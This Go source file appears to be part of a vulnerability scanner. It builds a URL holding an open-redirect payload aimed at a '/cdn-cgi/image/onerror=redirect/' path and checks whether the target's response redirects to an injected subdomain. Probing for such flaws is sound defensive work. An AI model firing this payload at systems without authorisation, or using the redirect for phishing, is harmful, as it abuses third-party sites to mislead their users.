package main

import (
	"net/http"
	"net/url"
	"strings"
)

func createRedirectURL(uri string) (string, string) {
	uu, err := url.Parse(uri)
	if err != nil {
		return "", ""
	}

	hostname := uu.Host
	payload := "/cdn-cgi/image/onerror=redirect/http://anything." + hostname
	uu.Path = payload

	return uu.String(), "anything." + hostname
}

func redirectHappened(uri, redirectSubdomain string) (bool, string) {

	req, err := http.NewRequest("GET", uri, nil)
	if err != nil {
		return false, ""
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, ""
	}

	defer resp.Body.Close()

	var uu *url.URL
	redURL := ""
	if resp.StatusCode > 300 && resp.StatusCode < 400 {
		uu, _ = resp.Location()
		redURL = uu.String()
	}

	// TODO perform a better check here
	if strings.Contains(redURL, redirectSubdomain) {
		return true, redURL
	}
	return false, ""
}
